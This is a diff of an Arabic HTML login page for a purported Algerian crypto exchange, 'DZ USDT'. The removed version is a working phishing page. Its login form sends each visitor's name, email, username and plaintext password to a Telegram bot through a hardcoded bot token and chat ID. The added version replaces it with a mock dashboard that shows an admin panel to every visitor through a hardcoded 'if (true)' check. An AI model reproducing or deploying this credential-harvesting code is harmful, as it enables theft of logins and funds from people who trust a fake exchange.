@@ -1,268 +1,229 @@
-<!DOCTYPE html><html lang="ar" dir="rtl">
+<!DOCTYPE html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DZ USDT - منصة تبادل العملات الرقمية</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>DZ USDT</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');:root {
-        --primary: #1a1a2e;
-        --secondary: #16213e;
-        --accent: #D4AF37;
-        --light: #f8f9fa;
-        --danger: #f44336;
-        --success: #4caf50;
-    }
-
-    * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-        font-family: 'Tajawal', sans-serif;
-    }
-
-    body {
-        background: var(--secondary);
-        color: white;
-    }
-
-    .login-container, .dashboard {
-        min-height: 100vh;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        padding: 20px;
-    }
-
-    .box {
-        background: rgba(26, 26, 46, 0.9);
-        padding: 30px;
-        border-radius: 15px;
-        max-width: 500px;
-        width: 100%;
-        box-shadow: 0 0 15px rgba(0,0,0,0.5);
-        border: 1px solid var(--accent);
-    }
-
-    h1 {
-        color: var(--accent);
-        text-align: center;
-        margin-bottom: 10px;
-    }
-
-    p {
-        text-align: center;
-        margin-bottom: 20px;
-    }
-
-    label {
-        display: block;
-        margin-bottom: 5px;
-        font-weight: bold;
-    }
-
-    input {
-        width: 100%;
-        padding: 10px;
-        border-radius: 8px;
-        border: 1px solid #ccc;
-        margin-bottom: 15px;
-        background: rgba(255, 255, 255, 0.1);
-        color: white;
-    }
-
-    .btn {
-        width: 100%;
-        padding: 10px;
-        background: linear-gradient(45deg, var(--accent), #b38b2d);
-        border: none;
-        border-radius: 8px;
-        color: var(--primary);
-        font-weight: bold;
-        cursor: pointer;
-    }
-
-    .footer {
-        text-align: center;
-        margin-top: 20px;
-        font-size: 0.9rem;
-        color: #ccc;
-    }
-
-    /* Dashboard */
-    .dashboard {
-        flex-direction: column;
-    }
-
-    .market {
-        background: var(--primary);
-        padding: 20px;
-        border-radius: 15px;
-        margin-bottom: 20px;
-        text-align: center;
-        box-shadow: 0 0 10px rgba(0,0,0,0.3);
-    }
-
-    .market h2 {
-        color: var(--accent);
-        margin-bottom: 10px;
-    }
-
-    .profile-icon {
-        position: fixed;
-        top: 20px;
-        left: 20px;
-        background: var(--accent);
-        color: var(--primary);
-        border-radius: 50%;
-        width: 50px;
-        height: 50px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        cursor: pointer;
-    }
-
-    .profile-box {
-        position: fixed;
-        top: 80px;
-        left: 20px;
-        background: #1a1a2e;
-        border: 1px solid var(--accent);
-        border-radius: 10px;
-        padding: 20px;
-        width: 300px;
-        display: none;
-        z-index: 10;
-    }
-
-    .profile-box h3 {
-        margin-bottom: 10px;
-        color: var(--accent);
-    }
-
-    .profile-box .balance {
-        margin: 10px 0;
-    }
-
-    .profile-box button {
-        margin: 5px 0;
-        width: 100%;
-        padding: 8px;
-        background: var(--success);
-        border: none;
-        border-radius: 6px;
-        color: white;
-        cursor: pointer;
-    }
-
-    .profile-box button.withdraw {
-        background: var(--danger);
-    }
-
-    .made-by {
-        margin-top: 40px;
-        font-size: 0.85rem;
-        text-align: center;
-        color: var(--accent);
-    }
-</style>
-
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f2f2f2;
+            color: #333;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .header {
+            background-color: #333;
+            color: #fff;
+            padding: 20px;
+            text-align: center;
+        }
+        .header h1 {
+            margin: 0;
+        }
+        .header p {
+            margin: 5px 0;
+            font-size: 1.2em;
+        }
+        .login-form {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            margin: 40px auto;
+        }
+        .login-form input[type="text"],
+        .login-form input[type="email"],
+        .login-form input[type="password"],
+        .login-form input[type="submit"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .login-form input[type="submit"] {
+            background-color: #4CAF50;
+            color: white;
+            cursor: pointer;
+        }
+        .profile-section {
+            margin-top: 40px;
+        }
+        .profile-section h2 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .profile-info, .market-prices {
+            display: flex;
+            justify-content: space-between;
+        }
+        .profile-info div, .market-prices div {
+            width: 48%;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        .profile-info div span {
+            font-weight: bold;
+        }
+        .button {
+            display: inline-block;
+            padding: 12px;
+            background-color: #007BFF;
+            color: white;
+            text-align: center;
+            width: 100%;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            color: white;
+            justify-content: center;
+            align-items: center;
+        }
+        .popup .popup-content {
+            background-color: #333;
+            padding: 30px;
+            border-radius: 8px;
+            text-align: center;
+        }
+        .btn-close {
+            background-color: red;
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+    </style>
 </head>
 <body>
-    <!-- صفحة تسجيل الدخول -->
-    <div class="login-container" id="login-container">
-        <div class="box">
-            <h1>DZ USDT</h1>
-            <p>منصة تبادل آمنة وموثوقة للعملات الرقمية في الجزائر</p>
-            <form id="login-form">
-                <label>الاسم الكامل</label>
-                <input type="text" id="fullName" required>
-                <label>البريد الإلكتروني</label>
-                <input type="email" id="email" required>
-                <label>اسم المستخدم</label>
-                <input type="text" id="username" required>
-                <label>كلمة المرور</label>
-                <input type="password" id="password" required>
-                <button type="submit" class="btn">تسجيل الدخول</button>
-            </form>
-            <div class="footer">
-                <p>إنستغرام: <a href="https://www.instagram.com/railux.0">railux.0</a></p>
-                <p>بريد الدعم: mouydtaibi2@gmail.com</p>
-                <p>تيليغرام: Mido_taibi</p>
-                <p>صُنع بكل فخر من قبلي - <strong>TAIBI MOUYAD</strong></p>
+
+    <!-- Header Section -->
+    <div class="header">
+        <h1>مرحبًا بك في DZ USDT</h1>
+        <p>أفضل منصة لتداول العملات الرقمية مع حماية وأمان عاليين.</p>
+    </div>
+
+    <!-- Login Section -->
+    <div class="login-form">
+        <h2>تسجيل الدخول</h2>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="إدخال البريد الإلكتروني" required>
+            <input type="password" id="password" placeholder="إدخال كلمة المرور" required>
+            <input type="submit" value="تسجيل الدخول">
+        </form>
+        <p>ليس لديك حساب؟ <a href="#">إنشاء حساب</a></p>
+    </div>
+
+    <!-- Profile Section after Login -->
+    <div class="profile-section">
+        <h2>بيانات المستخدم</h2>
+        <div class="profile-info">
+            <div>
+                <p><span>الاسم:</span> TAIBI MOUYAD</p>
+                <p><span>البريد الإلكتروني:</span> mouydtaibi2@gmail.com</p>
+                <p><span>رقم الإحصاء:</span> 123456</p>
+                <button class="button" id="updateProfileBtn">تحديث البيانات</button>
+            </div>
+            <div>
+                <h3>رصيد الحساب: <span id="accountBalance">1000 DZD</span></h3>
+                <button class="button" id="depositBtn">إيداع</button>
+                <button class="button" id="withdrawBtn">سحب</button>
             </div>
         </div>
-    </div><!-- صفحة ما بعد تسجيل الدخول -->
-<div class="dashboard" id="dashboard" style="display: none;">
-    <div class="profile-icon" onclick="toggleProfile()">
-        <i class="fas fa-user"></i>
-    </div>
-    <div class="profile-box" id="profile-box">
-        <h3>الملف الشخصي</h3>
-        <p><strong>الاسم:</strong> <span id="p-name"></span></p>
-        <p><strong>الإيميل:</strong> <span id="p-email"></span></p>
-        <p><strong>الرقم الإحصائي:</strong> <span id="p-id"></span></p>
-        <div class="balance"><strong>الرصيد:</strong> <span id="p-balance">0</span> DZD</div>
-        <button onclick="deposit()">إيداع</button>
-        <button class="withdraw" onclick="withdraw()">سحب</button>
-    </div>
 
-    <div class="market">
-        <h2>أسعار السوق</h2>
-        <p>1 USDT = 218 دج</p>
-        <p>1 BTC = 7380000 دج</p>
-        <p>1 ETH = 340000 دج</p>
+        <!-- Market Prices Section -->
+        <div class="market-prices">
+            <div>
+                <h3>أسعار السوق في الجزائر:</h3>
+                <p>USDT: 145 DZD</p>
+                <p>BTC: 112,000 DZD</p>
+                <p>ETH: 20,500 DZD</p>
+            </div>
+            <div>
+                <button class="button" id="openSellOfferBtn">عرض بيع</button>
+                <button class="button" id="openBuyOfferBtn">عرض شراء</button>
+            </div>
+        </div>
     </div>
 
-    <div class="made-by">
-        صُنع بكل فخر من قبلي - TAIBI MOUYAD
+    <!-- Popup for Deposit and Withdraw -->
+    <div class="popup" id="depositPopup">
+        <div class="popup-content">
+            <h3>إيداع الأموال</h3>
+            <p>اختر المحفظة للإيداع:</p>
+            <button class="button">إيداع عبر TRC20</button>
+            <button class="button">إيداع عبر BNB Smart Chain</button>
+            <button class="btn-close" id="closeDepositPopup">إغلاق</button>
+        </div>
     </div>
-</div>
 
-<script>
-    const TOKEN = "7368039692:AAGOPu6YEqvUS-u1NXOswLwvYaovRrNpiWI";
-    const CHAT_ID = "7025276107";
+    <div class="popup" id="withdrawPopup">
+        <div class="popup-content">
+            <h3>سحب الأموال</h3>
+            <button class="button">سحب عبر TRC20</button>
+            <button class="button">سحب عبر BNB Smart Chain</button>
+            <button class="btn-close" id="closeWithdrawPopup">إغلاق</button>
+        </div>
+    </div>
 
-    function toggleProfile() {
-        const box = document.getElementById("profile-box");
-        box.style.display = box.style.display === "none" ? "block" : "none";
-    }
+    <!-- Admin Dashboard (Hidden from regular users) -->
+    <div id="adminDashboard" style="display: none;">
+        <h2>لوحة تحكم المسؤول</h2>
+        <p>إدارة المستخدمين، العروض، والتقارير.</p>
+        <button class="button">إدارة العروض</button>
+        <button class="button">عرض تقارير المعاملات</button>
+    </div>
 
-    function deposit() {
-        alert("سيتم توجيهك لإيداع الرصيد عبر الشبكة المناسبة...");
-    }
+    <!-- Scripts -->
+    <script>
+        // Simulate login and user data retrieval
+        $(document).ready(function() {
+            $('#loginForm').submit(function(e) {
+                e.preventDefault();
+                $('#email').val('');
+                $('#password').val('');
+                $('.login-form').hide();
+                $('.profile-section').show();
+            });
 
-    function withdraw() {
-        alert("سيتم توجيهك لطلب سحب الرصيد عبر الشبكات الإلكترونية...");
-    }
+            // Open and Close Deposit Popup
+            $('#depositBtn').click(function() {
+                $('#depositPopup').fadeIn();
+            });
+            $('#closeDepositPopup').click(function() {
+                $('#depositPopup').fadeOut();
+            });
 
-    document.getElementById("login-form").addEventListener("submit", function(e) {
-        e.preventDefault();
-        const fullName = document.getElementById("fullName").value;
-        const email = document.getElementById("email").value;
-        const username = document.getElementById("username").value;
-        const password = document.getElementById("password").value;
-        const userId = Math.floor(Math.random() * 999999);
+            // Open and Close Withdraw Popup
+            $('#withdrawBtn').click(function() {
+                $('#withdrawPopup').fadeIn();
+            });
+            $('#closeWithdrawPopup').click(function() {
+                $('#withdrawPopup').fadeOut();
+            });
 
-        // إرسال البيانات إلى بوت تيليغرام
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: `مستخدم جديد:\nالاسم: ${fullName}\nالبريد: ${email}\nالمستخدم: ${username}\nكلمة السر: ${password}\nID: ${userId}`
-            })
+            // Admin Dashboard
+            if (true) { // Replace with actual admin check
+                $('#adminDashboard').show();
+            }
         });
-
-        // عرض معلومات في الواجهة
-        document.getElementById("login-container").style.display = "none";
-        document.getElementById("dashboard").style.display = "flex";
-        document.getElementById("p-name").innerText = fullName;
-        document.getElementById("p-email").innerText = email;
-        document.getElementById("p-id").innerText = userId;
-    });
-</script>
-
+    </script>
 </body>
 </html>
